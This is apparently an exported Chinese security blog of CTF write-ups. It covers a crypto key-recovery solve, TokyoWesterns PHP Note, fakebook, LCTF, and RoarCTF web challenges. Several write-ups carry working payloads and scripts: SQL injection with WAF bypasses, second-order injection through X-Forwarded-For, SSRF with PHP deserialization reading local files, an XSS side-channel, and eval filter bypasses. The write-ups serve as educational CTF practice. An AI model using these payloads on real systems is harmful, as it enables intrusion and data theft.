class="number">0xc464714f5cdce458f32608f8b5e2002e</span>,<span class="number">0xf944aaccf6779a65e8ba74795da3c41d</span>,<span class="number">0x552682756304d662fa18e624b09b2ac5</span>]</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0xb36b6b62a7e685bd1158744662c5d04a</span>,<span class="number">0x614d86b5b6653cdc8f33368c41e99254</span>,<span class="number">0x292a7ff7f12b4e21db00e593246be5a0</span>,<span class="number">0x64f930da37d494c634fa22a609342ffe</span>,<span class="number">0xaa3825e62d053fb0eb8e7e2621dabfe7</span>,<span class="number">0xf2ffdf4beb933681844c70190ecf60bf</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这边这个算法值得好好体会, 从一位开始向更多的位数进行扩展, 一开始的0,1是对最低位的猜测</span></span><br><span class="line"><span class="comment"># 多解的情况会出现比如10,00,11,01都符合情况</span></span><br><span class="line">q = [<span class="string">'0'</span>,<span class="string">'1'</span>]</span><br><span class="line"><span class="keyword">while</span> len(q) != <span class="number">0</span>:</span><br><span class="line">    key = q.pop(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># 通过flag位来指示操作</span></span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    <span class="comment"># 如果这个key将六组密文解密后的结果与明文都相同, 循环结束得到了key</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> decrypt(int(enc[i]),int(key,<span class="number">2</span>)) != int(plain[i]):</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> key</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">	<span class="comment"># 判断高一位为0是否符合条件, 注意这边rjust(128).replace(' ','0')是为了将所有结果的长度统一到最长, 否则-1-len(key)可能会超出范围</span></span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> bin(decrypt(int(enc[i]),int(<span class="string">'0'</span>+key,<span class="number">2</span>)))[<span class="number">2</span>:].rjust(<span class="number">128</span>).replace(<span class="string">' '</span>,<span class="string">'0'</span>)[<span class="number">-1</span>-len(key):] != bin(plain[i])[<span class="number">2</span>:].rjust(<span class="number">128</span>).replace(<span class="string">' '</span>,<span class="string">'0'</span>)[<span class="number">-1</span>-len(key):]:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        q.append(<span class="string">'0'</span>+key)</span><br><span class="line"><span class="comment"># 判断高一位为1是否符合条件, 注意这边rjust(128).replace(' ','0')是为了将所有结果的长度统一到最长, 否则-1-len(key)可能会超出范围</span></span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> bin(decrypt(int(enc[i]),int(<span class="string">'1'</span>+key,<span class="number">2</span>)))[<span class="number">2</span>:].rjust(<span class="number">128</span>).replace(<span class="string">' '</span>,<span class="string">'0'</span>)[<span class="number">-1</span>-len(key):] != bin(plain[i])[<span class="number">2</span>:].rjust(<span class="number">128</span>).replace(<span class="string">' '</span>,<span class="string">'0'</span>)[<span class="number">-1</span>-len(key):]:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        q.append(<span class="string">'1'</span>+key)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解密flag</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"TWCTF&#123;"</span> + str(hex(decrypt(the_flag,int(key,<span class="number">2</span>)))[<span class="number">2</span>:<span class="number">-1</span>]) + <span class="string">"&#125;"</span></span><br></pre></td></tr></table></figure>
<p>因为是线性方程组,所以还有使用z3的解法:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mport z3</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">BITS = <span class="number">128</span></span><br><span class="line">ROUNDS = <span class="number">765</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(msg, key)</span>:</span></span><br><span class="line">    enc = msg</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(ROUNDS):</span><br><span class="line">        enc = (enc + key)</span><br><span class="line">        enc = enc ^ key</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line">plain1= <span class="number">0x029abc13947b5373b86a1dc1d423807a</span></span><br><span class="line">enc1  = <span class="number">0xb36b6b62a7e685bd1158744662c5d04a</span></span><br><span class="line">plain2= <span class="number">0xeeb83b72d3336a80a853bf9c61d6f254</span></span><br><span class="line">enc2  = <span class="number">0x614d86b5b6653cdc8f33368c41e99254</span></span><br><span class="line">plain3= <span class="number">0x7a0e5ffc7208f978b81475201fbeb3a0</span></span><br><span class="line">enc3  = <span class="number">0x292a7ff7f12b4e21db00e593246be5a0</span></span><br><span class="line">plain4= <span class="number">0xc464714f5cdce458f32608f8b5e2002e</span></span><br><span class="line">enc4  = <span class="number">0x64f930da37d494c634fa22a609342ffe</span></span><br><span class="line">plain5= <span class="number">0xf944aaccf6779a65e8ba74795da3c41d</span></span><br><span class="line">enc5  = <span class="number">0xaa3825e62d053fb0eb8e7e2621dabfe7</span></span><br><span class="line">plain6= <span class="number">0x552682756304d662fa18e624b09b2ac5</span></span><br><span class="line">enc6  = <span class="number">0xf2ffdf4beb933681844c70190ecf60bf</span></span><br><span class="line"></span><br><span class="line">k = z3.BitVec(<span class="string">"k"</span>, <span class="number">128</span>)</span><br><span class="line">s = z3.Solver()</span><br><span class="line">s.add(encrypt(plain1, k) == enc1)</span><br><span class="line">s.add(encrypt(plain2, k) == enc2)</span><br><span class="line">s.add(encrypt(plain3, k) == enc3)</span><br><span class="line">s.add(encrypt(plain4, k) == enc4)</span><br><span class="line">s.add(encrypt(plain5, k) == enc5)</span><br><span class="line">s.add(encrypt(plain6, k) == enc6)</span><br><span class="line">print(s.check())</span><br><span class="line"><span class="keyword">if</span> s.check() == z3.sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    print(m)</span><br></pre></td></tr></table></figure>
<p>然后使用key解密即可</p>
<h1>web</h1>
<h2 id="PHP-Note">PHP Note</h2>
<p>考察windows测信道攻击</p>
<p><a href="http://www.rai4over.cn/2019/09/10/TokyoWesterns-CTF-2019-PHP-Note-WriteUp/" target="_blank" rel="noopener">http://www.rai4over.cn/2019/09/10/TokyoWesterns-CTF-2019-PHP-Note-WriteUp/</a></p>
<p>题目标志:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Server: Microsoft-IIS/10.0</span><br></pre></td></tr></table></figure>
<p>可是为什么我的windows defender 拦截不到呢…</p>
<p>摘录一下脚本, 以后可能用得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    url = <span class="string">"http://phpnote.chal.ctf.westerns.tokyo/"</span></span><br><span class="line">    session = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">10</span>,<span class="number">64</span>):</span><br><span class="line">        s = requests.Session()</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            data = &#123;<span class="string">"realname"</span>: <span class="string">"xxxxxxxxxxxx"</span>&#125;</span><br><span class="line">            s.post(url + <span class="string">"/?action=login"</span>, data=data)</span><br><span class="line">            payload = <span class="string">'''&lt;script&gt;</span></span><br><span class="line"><span class="string">            var body = document.body.innerHTML;</span></span><br><span class="line"><span class="string">            var a = &#123;1: ''&#125;;</span></span><br><span class="line"><span class="string">            var x = a[Number(body.charCodeAt('''</span> + str(index) + <span class="string">''') == '''</span> + str(x) + <span class="string">''')];</span></span><br><span class="line"><span class="string">            var mal = "X5O!P%@AP[4\\\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*" + x;</span></span><br><span class="line"><span class="string">            eval(mal);</span></span><br><span class="line"><span class="string">&lt;/script&gt;&lt;body&gt;'''</span></span><br><span class="line">            print(payload)</span><br><span class="line">            data = &#123;<span class="string">"realname"</span>: payload, <span class="string">'nickname'</span>: <span class="string">'&lt;/body&gt;'</span>&#125;</span><br><span class="line">            s.post(url + <span class="string">"/?action=login"</span>, data=data)</span><br><span class="line">            rs = s.get(url + <span class="string">"/?action=index"</span>)</span><br><span class="line">            print(str(index) + <span class="string">'   '</span> + str(x))</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">'Login'</span> <span class="keyword">in</span> rs.text):</span><br><span class="line">                session = session + chr(x)</span><br><span class="line">                print(<span class="string">"session : "</span> + session)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>SSRF 题型记录[working forever]</title>
    <url>/2019/06/05/SSRF/</url>
    <content><![CDATA[<h2 id="2019-De1ctf-shellshellshell">2019 De1ctf shellshellshell</h2>
<p>这个网站长这样:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/62526250-78404480-b86b-11e9-9e2c-ccab6f04e184.png" alt="QQ截图20190806165844"></p>
<p>然后他的api都是</p>
<p>index.php?action=index</p>
<p>index.php?action=publish</p>
<p>index.php?action=logout</p>
<p>之类的</p>
<p>Source code linking:</p>
<p><a href="http://127.0.0.1:8302/view/" target="_blank" rel="noopener">http://127.0.0.1:8302/view/</a>(many source file)</p>
<p>Guess the existence of <code>user.php</code> and <code>config.php</code>,and try several ways to get access to it .</p>
<p><a href="http://127.0.0.1:8302/user.php~" target="_blank" rel="noopener">http://127.0.0.1:8302/user.php~</a><br>
<a href="http://127.0.0.1:8302/user.php.bak" target="_blank" rel="noopener">http://127.0.0.1:8302/user.php.bak</a><br>
<a href="http://127.0.0.1:8302/user.php.swp" target="_blank" rel="noopener">http://127.0.0.1:8302/user.php.swp</a><br>
<a href="http://127.0.0.1:8302/.user.php~" target="_blank" rel="noopener">http://127.0.0.1:8302/.user.php~</a><br>
<a href="http://127.0.0.1:8302/.user.php.bak" target="_blank" rel="noopener">http://127.0.0.1:8302/.user.php.bak</a><br>
<a href="http://127.0.0.1:8302/.user.php.swp" target="_blank" rel="noopener">http://127.0.0.1:8302/.user.php.swp</a></p>
<p><a href="http://127.0.0.1:8302/config.php~" target="_blank" rel="noopener">http://127.0.0.1:8302/config.php~</a></p>
<p>See exploitment:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signature=1`,`O:4:&quot;Mood&quot;:3:&#123;s:4:&quot;mood&quot;;i:1;s:2:&quot;ip&quot;;s:9:&quot;127.0.0.1&quot;;s:4:&quot;date&quot;;s:1:&quot;0&quot;;&#125;`),(4,`bbb`,(select concat(username,password) from ctf_users where is_admin=1),`O:4:&quot;Mood&quot;:3:&#123;s:4:&quot;mood&quot;;i:1;s:2:&quot;ip&quot;;s:9:&quot;127.0.0.1&quot;;s:4:&quot;date&quot;;s:1:&quot;0&quot;;&#125;`)#&amp;mood=0</span><br></pre></td></tr></table></figure>
<p>check the phpinfo( I made this in docker , here might be some error, anyway):</p>
<p><img src="https://user-images.githubusercontent.com/40637063/62533827-34a10700-b87a-11e9-88d5-60888db5dc73.png" alt="QQ截图20190806184325"></p>
<p><a href="https://blog.csdn.net/loongwong2011/article/details/52155046" target="_blank" rel="noopener">simple talk about soap,http,tcp,ip</a></p>
<p><img src="https://user-images.githubusercontent.com/40637063/62526153-44651f00-b86b-11e9-91b2-e210de8fb838.png" alt="QQ截图20190806165527"></p>
<h2 id="2018网鼎杯-fakebook">2018网鼎杯 fakebook</h2>
<p><img src="https://user-images.githubusercontent.com/40637063/61576225-e665d700-ab09-11e9-8a70-de85e976bb8c.png" alt="image"></p>
<p>这里有登录和注册功能.注册的时候除了常规的信息之外还让我们填写了博客地址.填写完之后登录是这样的</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61576261-583e2080-ab0a-11e9-9736-f2cbc5dc2210.png" alt="image"></p>
<p>点进个人链接会发现页面会尝试去获取博客的内容:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61576276-8f143680-ab0a-11e9-826f-ad5c1a505b14.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61576271-828fde00-ab0a-11e9-8eaf-ee2787669db0.png" alt="image"></p>
<p>首先发现<code>robots.txt</code> 中有<code>user.php.bak</code>.访问获得源码.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>容易看出,服务端要去访问我们给他传递的博客地址,这里没有任何防护,也就是说存在<code>ssrf</code>漏洞.</p>
<p>通过扫描和盲猜,可以发现<code>flag.php</code>的存在.</p>
<p>那么就可以让本来应该去访问博客的服务端去访问他自己的<code>flag.php</code>.</p>
<p>另外,在内容展示的页面发现了一处注入(参数no):</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61576295-fb8f3580-ab0a-11e9-8c28-fd9c6b5277f8.png" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://web23.buuoj.cn/view.php?no=-1%20union%20select%201,1,1,1%23</span><br></pre></td></tr></table></figure>
<p>结果被waf检测到了,那么可以把空格用注释符号来替代:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://web23.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,1,1,1%23</span><br></pre></td></tr></table></figure>
<p><img src="https://user-images.githubusercontent.com/40637063/61576335-8e2fd480-ab0b-11e9-9e13-e7952db8439d.png" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://web23.buuoj.cn/view.php?no=1 and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),1)%23</span><br><span class="line"></span><br><span class="line">http://web23.buuoj.cn/view.php?no=1 and updatexml(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),&apos;~&apos;),1)%23</span><br></pre></td></tr></table></figure>
<p>然后逐个查看字段的内容,一直到data字段:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://web23.buuoj.cn/view.php?no=1 and updatexml(1,concat(&apos;~&apos;,(select group_concat(data) from users),&apos;~&apos;),1)%23</span><br></pre></td></tr></table></figure>
<p>回显如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] query error! (XPATH syntax error: &apos;~O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:&apos;)</span><br></pre></td></tr></table></figure>
<p>一个序列化字符串…可以想到这里可能是将data字段进行反序列化之后在页面上进行回显.由此而产生的payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://web23.buuoj.cn/view.php?no=-1/**/union/**/select 1,2,3,&apos;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&apos; #</span><br></pre></td></tr></table></figure>
<p>而对空格的waf似乎也只是针对union而已.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61576614-ace39a80-ab0e-11e9-9508-2f78be14488a.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61575863-22963900-ab04-11e9-99ee-6f9c76db029d.png" alt="image"></p>
<h2 id="LCTF-2017-签到题">LCTF-2017-签到题</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if(!$_GET[&apos;site&apos;])&#123; </span><br><span class="line">	$str = &lt;&lt;&lt;EOD</span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">look source code: </span><br><span class="line">&lt;form action=&apos;&apos; method=&apos;GET&apos;&gt; </span><br><span class="line">&lt;input type=&apos;submit&apos; name=&apos;submit&apos; /&gt; </span><br><span class="line">&lt;input type=&apos;text&apos; name=&apos;site&apos; style=&quot;width:1000px&quot; value=&quot;https://www.baidu.com&quot;/&gt; </span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">EOD;</span><br><span class="line"></span><br><span class="line">echo $str;</span><br><span class="line">	die(); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[&apos;site&apos;]; </span><br><span class="line">$url_schema = parse_url($url); </span><br><span class="line">$host = $url_schema[&apos;host&apos;]; </span><br><span class="line">$request_url = $url.&quot;/&quot;; </span><br><span class="line"></span><br><span class="line">if ($host !== &apos;www.baidu.com&apos;)&#123; </span><br><span class="line">	die(&quot;wrong site&quot;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ci = curl_init();</span><br><span class="line">curl_setopt($ci, CURLOPT_URL, $request_url);</span><br><span class="line">curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$res = curl_exec($ci);</span><br><span class="line">curl_close($ci);</span><br><span class="line"></span><br><span class="line">if($res)&#123; </span><br><span class="line">	echo &quot;&lt;h1&gt;Source Code:&lt;/h1&gt;&quot;; </span><br><span class="line">	echo $request_url; </span><br><span class="line">	echo &quot;&lt;hr /&gt;&quot;; </span><br><span class="line">	echo htmlentities($res); </span><br><span class="line">&#125;else&#123; </span><br><span class="line">	echo &quot;get source failed&quot;; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>Keypoint:</p>
<ul>
<li>using protocal <code>file</code> to read local file</li>
<li>must bypass the limitation to hostname (must have <code>www.baidu.com</code>), but <code>file://host/path</code> can alse read local file in <code>path</code></li>
<li>to make <code>/</code> useless, just add a <code>?</code> or <code>#</code>.</li>
</ul>
]]></content>
      <categories>
        <category>题型记录</category>
      </categories>
  </entry>
  <entry>
    <title>RoarCTF复现</title>
    <url>/2019/10/22/RoarCTFwp/</url>
    <content><![CDATA[<h1>web</h1>
<h2 id="online-proxy">online_proxy</h2>
<p>特征: 第一次登录后源代码内容有如下:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/67630479-64810900-f8c3-11e9-8f83-7f39e711f736.png" alt="image"></p>
<p>换一个<strong>X-Forwarded-For</strong> 后会发现currentip是根据xff判别的</p>
<p><img src="https://user-images.githubusercontent.com/40637063/67630507-c6da0980-f8c3-11e9-8d87-eff135976d57.png" alt="image"></p>
<p>那么有理由认为上一个ip被存储进了数据库中,并在每次检测到访问ip和上一个ip不同的时候就会改变数据库. 源码这里也写到了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$result = query(<span class="string">"select current_ip, last_ip from ip_log where uuid = '"</span>.addslashes($uuid).<span class="string">"'"</span>);</span><br><span class="line"><span class="keyword">if</span>(count($result) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>($ip !== $result[<span class="number">0</span>][<span class="string">'current_ip'</span>]) &#123;</span><br><span class="line">        $last_ip = $result[<span class="number">0</span>][<span class="string">'current_ip'</span>];</span><br><span class="line">        query(<span class="string">"delete from ip_log where uuid='"</span>.addslashes($uuid).<span class="string">"'"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $last_ip = $result[<span class="number">0</span>][<span class="string">'last_ip'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">query(<span class="string">"insert into ip_log values ('"</span>.addslashes($uuid).<span class="string">"', '"</span>.addslashes($ip).<span class="string">"', '$last_ip');"</span>);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"\n&lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip "</span>.($last_ip !== <span class="string">""</span> ? <span class="string">"\nLast Ip: "</span>.$last_ip : <span class="string">""</span>).<span class="string">" --&gt;"</span>);</span><br></pre></td></tr></table></figure>
<p>解法:</p>
<p>先用<code>1'|1|'1</code>作为xff访问网站网站 , 访问成功之后改变xff, 再次访问, 这个时候由于前后xff不一致, 原来存储进数据库currentip的ip被重新提取出来存进lastip项中, 如果这个lastip没有过滤的话,就可以造成<strong>二次注入</strong>, 事实上也确实如此, 但这个可能得猜…在第二次访问之后, payload被重新插入进数据库中, 带着第二次访问的xff来第三次访问这个网站,可以看到</p>
<p><img src="https://user-images.githubusercontent.com/40637063/67630576-d443c380-f8c4-11e9-859d-b807ff467d3c.png" alt="image"></p>
<p>成功执行了.</p>
<p>搬运赵师傅的脚本学习学习</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">"http://localhost:8302/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_sql</span><span class="params">(sql)</span>:</span></span><br><span class="line">    print(<span class="string">"[*]请求语句："</span> + sql)</span><br><span class="line">    return_result = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">"0'|length(("</span> + sql + <span class="string">"))|'0"</span></span><br><span class="line">    session = requests.session()</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: payload&#125;)</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)</span><br><span class="line">    start_pos = r.text.find(<span class="string">"Last Ip: "</span>)</span><br><span class="line">    end_pos = r.text.find(<span class="string">" --&gt;"</span>, start_pos)</span><br><span class="line">    length = int(r.text[start_pos + <span class="number">9</span>: end_pos])</span><br><span class="line">    print(<span class="string">"[+]长度："</span> + str(length))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, length + <span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        payload = <span class="string">"0'|conv(hex(substr(("</span> + sql + <span class="string">"),"</span> + str(i) + <span class="string">",5)),16,10)|'0"</span></span><br><span class="line"></span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: payload&#125;)</span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)</span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)</span><br><span class="line">        start_pos = r.text.find(<span class="string">"Last Ip: "</span>)</span><br><span class="line">        end_pos = r.text.find(<span class="string">" --&gt;"</span>, start_pos)</span><br><span class="line">        result = int(r.text[start_pos + <span class="number">9</span>: end_pos])</span><br><span class="line">        return_result += bytes.fromhex(hex(result)[<span class="number">2</span>:]).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"[+]位置 "</span> + str(i) + <span class="string">" 请求五位成功:"</span> + bytes.fromhex(hex(result)[<span class="number">2</span>:]).decode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> return_result</span><br><span class="line"><span class="comment"># 获取数据库</span></span><br><span class="line">print(<span class="string">"[+]获取成功："</span> + execute_sql(<span class="string">"SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库表</span></span><br><span class="line">print(<span class="string">"[+]获取成功："</span> + execute_sql(<span class="string">"SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e'"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库表</span></span><br><span class="line">print(<span class="string">"[+]获取成功："</span> + execute_sql(<span class="string">"SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e' AND TABLE_NAME = 'F4l9_t4b1e' "</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取表中内容</span></span><br><span class="line">print(<span class="string">"[+]获取成功："</span> + execute_sql(<span class="string">"SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e"</span>))</span><br></pre></td></tr></table></figure>
<p>5555555</p>
<p>在addslashes后插入数据在数据库中是这样的</p>
<p><img src="https://user-images.githubusercontent.com/40637063/67630753-8bd9d500-f8c7-11e9-9e14-731b86ed3e4c.png" alt="image"></p>
<p>第二行是提取出来不经过addslashes重新插入的结果</p>
<h2 id="easy-calc">easy_calc</h2>
<p><a href="https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/" target="_blank" rel="noopener">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexdec(bin2hex(&apos;/&apos;));</span><br><span class="line">?+num=scandir(hex2bin(dechex(47))) #解码出来的会自动带上引号</span><br><span class="line">hexdec(bin2hex(&apos;/f1agg&apos;));</span><br><span class="line">?+num=file_get_contents(hex2bin(dechex(52115961636711)))</span><br></pre></td></tr></table></figure>
<p>源码是这么执行语句的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">       $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">       <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">               <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                       <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br></pre></td></tr></table></figure>
<h2 id="Simple-UPload">Simple UPload</h2>
